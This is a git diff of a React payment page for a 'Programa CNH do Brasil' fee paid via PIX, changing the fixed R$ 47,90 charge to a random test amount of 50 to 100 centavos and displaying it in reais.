@@ -26,8 +26,12 @@ const PaymentPage: React.FC = () => {
     const [companyInfo, setCompanyInfo] = useState<any>(null);
     const [isCopied, setIsCopied] = useState(false);
     const [userName, setUserName] = useState('');
+    const [amountInCents, setAmountInCents] = useState(0);
 
     useEffect(() => {
+        const randomAmount = Math.floor(Math.random() * 51) + 50; // Gera um valor entre 50 e 100 centavos
+        setAmountInCents(randomAmount);
+
         const createPayment = async () => {
             const userDataString = sessionStorage.getItem('cnh_userData');
             if (!userDataString) {
@@ -44,7 +48,7 @@ const PaymentPage: React.FC = () => {
                 setCompanyInfo(companyData);
 
                 const payload = {
-                    amount: 4790, // R$ 47,90
+                    amount: randomAmount,
                     customer: {
                         name: userData.name,
                         email: userData.email,
@@ -52,8 +56,8 @@ const PaymentPage: React.FC = () => {
                         phone: userData.phone.replace(/\D/g, ''),
                     },
                     items: [{ 
-                        title: 'Taxa de Adesão - Programa CNH do Brasil', 
-                        unit_price: 4790, 
+                        title: 'Taxa de Adesão - Programa CNH do Brasil (TESTE)', 
+                        unit_price: randomAmount, 
                         quantity: 1,
                         tangible: false
                     }],
@@ -112,6 +116,7 @@ const PaymentPage: React.FC = () => {
             return <div className="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 rounded-md flex items-center gap-3"><AlertTriangle size={20} /> <p>{error}</p></div>;
         }
         if (paymentInfo && companyInfo) {
+            const amountInReais = (amountInCents / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
             return (
                 <div className="text-center">
                     <h1 className="text-3xl font-bold text-gray-800 mb-2">Taxa de Emissão da CNH</h1>
@@ -158,7 +163,7 @@ const PaymentPage: React.FC = () => {
                     </div>
 
                     <div className="space-y-4">
-                        <p className="font-semibold text-gray-700 text-lg">Pague o valor de <strong>R$ 47,90</strong> via PIX:</p>
+                        <p className="font-semibold text-gray-700 text-lg">Pague o valor de <strong>{amountInReais}</strong> via PIX:</p>
                         <div className="relative">
                             <input type="text" readOnly value={paymentInfo.Pix.QrCodeText} className="w-full bg-gray-100 border border-gray-300 rounded-lg p-3 pr-12 text-sm text-gray-600" />
                             <button onClick={handleCopy} className="absolute right-2 top-1/2 -translate-y-1/2 p-2 text-gray-500 hover:bg-gray-200 rounded-full">
